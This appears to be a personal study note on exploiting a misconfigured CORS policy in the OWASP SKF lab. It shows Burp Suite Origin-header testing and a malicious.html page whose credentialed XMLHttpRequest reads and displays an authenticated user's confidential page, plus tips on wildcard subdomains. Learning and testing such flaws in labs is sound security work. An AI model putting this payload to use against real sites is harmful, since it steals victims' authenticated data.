---
tags:
  - vulnerabilty
  - "#cors"
---
# What is CORS?

**Cross-Origin Resource Sharing**

When are different domains, you can realize a request from other domain (imagine that you hacked a domain with an [XSS](../XSS/XSS.md) but you can point to other domain by this)

If a CORS is bad defined you can point from a external domain to other resources from other pages.

By default the policy of **same origin** in this case don't work because as third-party server is not allowed to bring resources 

The policy of CORS define **the third-party domains** that can realize request to take resources, only the domain that you define them, sometimes is bad defined and used wildcards ( like * ) 

---

# Exploiting

We are going to create a malicious page that have an script that allow to see all the content that the user is viewing, this is possible because the CORS is bad configured

## Intercept the request with burpsuite

The credential are admin:admin

![](../../Images/Pasted%20image%2020230905172127.png)


Intercept this with Burpsuite and send to Repeater, in the repeater send the request and in the response we can see the following headers:
````java
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: *
````

We can introduce a header in our request:

````bash
Origin: https.//test.com
````

Send the request and see if in the header Access-Control-Allow-Origin put the URL that indicate

![](../../Images/Pasted%20image%2020230905172517.png)

This allow to that domain to do requests.

This is a big failure, now as a malicious attacker I can control this

We can put some domain that is under our control, or put localhost

![](../../Images/Pasted%20image%2020230905172850.png)

The header `Access-Control-Allow-Credentials` --> Allow to do request that contain session cookie and more

Now we are going to create a file named malicious.html

````html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('GET', 'http://127.0.0.1:5000/confidential', true);
    req.withCredentials = true;
    req.send();

    function reqListener(){
            document.getElementById("stolenInfo").innerHTML = req.responseText;
        }

</script>

<center><h1>You have been Pwnd!!</h1></center>

<p id="stolenInfo"></p>
````

We are going to get all the source code of the website (that we can't see because we are not authenticated) an store in a variable

`req.onload = reqListener` --> When the user go to our website, what we want to happen (reqListener is a function)

`req.open .. true` --> Petition have to bee asynchronous (we wait that load all and do the petition)

`req.withCredentials` --> This is because the user is authenticated and we need the session cookie. We put this because we see in the response the `Access-Control-Allow-Credentials: true` header

`reqListener` --> In this function we want to display all that the user is viewing

The output of this is not beautiful, this is because we don't have the files like css, js, svg...

To resolve this, if you see the log in python server, you can see the resources:

![](../../Images/Pasted%20image%2020230905231139.png)

You can recreate that, create folders with mkdir, download the files (with wget) and put them in their correspondent folder 

---

# Tips

Imagine that the CORS policy is something like this:

````bash
*.dominio.com
````

You can create a domain like **f.domain.com** 

- Sometime you don't see the header `Access-Control-Allow-Origin` but if you put a Origin in the request with some domain or subdomain that are authorize, this is valid form to enumerate them. You can fuzzing this header.

---
# Labs

Build the image:

> sudo docker pull blabla1337/owasp-skf-lab:cors

To launch the image use:

````bash
sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:cors
````


